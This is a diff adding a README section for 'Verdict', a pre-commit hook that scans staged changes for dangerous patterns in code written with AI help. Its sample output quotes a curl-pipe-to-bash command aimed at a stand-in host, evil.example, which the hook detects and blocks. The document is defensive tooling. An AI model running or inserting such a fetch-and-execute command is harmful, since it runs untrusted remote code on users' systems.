@@ -219,6 +219,30 @@ See [CONTRIBUTING.md](CONTRIBUTING.md). We welcome:
 - Integration patches
 - Documentation improvements
 
+## Git Pre-Commit Hook
+
+Stop dangerous AI output before it becomes permanent history:
+
+```bash
+verdict hook install     # once per repo
+# ... write code with AI help ...
+git commit                # Verdict auto-scans your staged changes
+```
+
+```
+$ git commit -m "add agent setup"
+verdict: checking staged changes for dangerous patterns...
+[FAIL] verdict: 1 dangerous pattern(s) in staged changes
+  [critical] curl-pipe: found `curl -s http://evil.example/install.sh | bash`
+    line 3, chars 0-45
+Blocked by Verdict. Fix the change, or override with:  git commit --no-verify
+```
+
+- `verdict hook install` — wires a no-dependency POSIX hook into `.git/hooks/`. It refuses to overwrite another tool's security hook.
+- `verdict hook status` / `verdict hook uninstall` — manage it.
+- `verdict diff-check` — the underlying scan (run it directly anywhere).
+- Deliberately override: `git commit --no-verify` (or `VERDICT_SKIP=1`).
+
 ## The 30-Second Demo
 
 ```
